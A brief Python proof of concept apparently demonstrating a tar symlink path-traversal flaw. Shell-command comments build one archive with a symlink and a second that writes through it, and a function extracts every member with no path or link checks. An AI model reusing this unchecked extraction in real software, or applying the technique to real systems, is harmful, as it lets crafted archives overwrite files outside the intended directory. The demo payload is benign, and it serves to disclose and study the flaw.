
import tarfile


dir_name = "/tmp/anything"
file1_name = "/tmp/a.tar.gz"  # ln -sv /tmp/a test_tar/a;tar -cvf a.tar.gz test_tar/a
file2_name = "/tmp/b.tar.gz"  # echo "it is just poc" > /tmp/payload; rm -rf test_tar; cp /tmp/payload test_tar/a;tar -cvf b.tar.gz test_tar/a


def vuln_tar(tar_path):
	"""
	:param tar_path:
	:return:
	"""
	import tarfile
	tar = tarfile.open(tar_path, "r:tar")
	file_names = tar.getnames()
	for file_name in file_names:
	    tar.extract(file_name, dir_name)
	tar.close()


vuln_tar(file1_name)
vuln_tar(file2_name)
